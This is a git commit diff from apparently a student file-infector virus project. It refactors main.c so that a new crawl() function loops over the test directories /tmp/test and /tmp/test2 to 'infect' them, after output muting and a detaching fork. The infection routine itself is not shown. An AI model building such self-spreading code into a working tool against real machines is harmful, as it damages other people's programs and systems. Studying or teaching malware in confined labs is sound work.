3d49569a7fbe39505b3e48e00e47236457251b35
Mewen Batty <scorpionem86@gmail.com>
2026-04-13 18:19:53 +0200

    just wanted it to look coller

--- src/main.c
+++ src/main.c
@@ -6,7 +6,7 @@
 /*   By: mbatty <mbatty@student.42angouleme.fr>     +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2026/02/20 12:30:09 by mbatty            #+#    #+#             */
-/*   Updated: 2026/04/13 18:01:45 by mbatty           ###   ########.fr       */
+/*   Updated: 2026/04/13 18:19:44 by mbatty           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -32,6 +32,23 @@ int	mute_outputs()
 	return (0);
 }
 
+/*
+	Goes over all target directories and infects them
+*/
+int	crawl()
+{
+	const char	*TARGET_DIRS[] = {
+		"/tmp/test",
+		"/tmp/test2"
+	};
+	#define DIRS_COUNT (sizeof(TARGET_DIRS) / sizeof(char *))
+
+	for (size_t i = 0; i < DIRS_COUNT; i++)
+		if (crawl_dir(TARGET_DIRS[i]) == -1)
+			return (-1);
+	return (0);
+}
+
 int	main(void)
 {
 	if (mute_outputs() == -1)
@@ -41,8 +58,8 @@ int	main(void)
 	if (pid == -1 || pid != 0)
 		return (0);
 
-	crawl_dir("/tmp/test");
-	crawl_dir("/tmp/test2");
+	if (crawl() == -1)
+		return (0);
 
 	// execute infected binary if there is one
 	return (0);
